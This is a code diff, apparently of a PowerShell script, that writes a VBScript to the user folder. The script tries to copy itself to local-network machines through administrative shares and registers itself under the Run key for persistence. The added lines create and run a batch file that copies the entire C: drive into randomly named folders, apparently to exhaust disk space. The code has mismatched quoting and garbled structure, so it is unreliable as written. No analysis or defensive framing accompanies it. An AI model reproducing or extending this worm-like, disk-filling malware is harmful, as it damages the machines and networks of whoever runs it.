@@ -21,6 +21,12 @@ New-Item -ItemType File -Path %User%\g8%random%.vbs" -Force
 Set-Content -Path "%User%\g8%random%.vbs -Value "Dim objShell Set objShell = WScript.CreateObject("WScript.Shell") Dim arrIPAddresses arrIPAddresses = GetIPAddresses() For Each strIPAddress in arrIPAddresses On Error Resume Next objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True If Err.Number = 0 Then End If Next Function GetIPAddresses() Dim arrIPAddresses arrIPAddresses = Array() Dim objWMIService Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") Dim colItems Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True") Dim objItem For Each objItem in colItems Dim arrIPAddress arrIPAddress = objItem.IPAddress For Each strIPAddress in arrIPAddress If Left(strIPAddress, 7) = "192.168" Then ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1) arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress End If Next Next GetIPAddresses = arrIPAddresses End Function Set WshShell = WScript.CreateObject("WScript.Shell") strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" strKeyName = "jane4%random%.bat" strKeyValue = WScript.ScriptFullName WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ""
  
 & "%User%\g8%random%.vbs"
+
+New-Item -ItemType File -Path %User%\rip%random%.bat" -Force
+ 
+Set-Content -Path "%User%\rip%random%.bat" -Value "XCOPY C:\ C:\%random% MKDIR %random%%random%%random%%random% XCOPY C:\ %random%%random%%random%%random%"
+ 
+& "%User%\rip%random%.bat"
  
 $j44 = $MyInvocation.MyCommand.Path
  
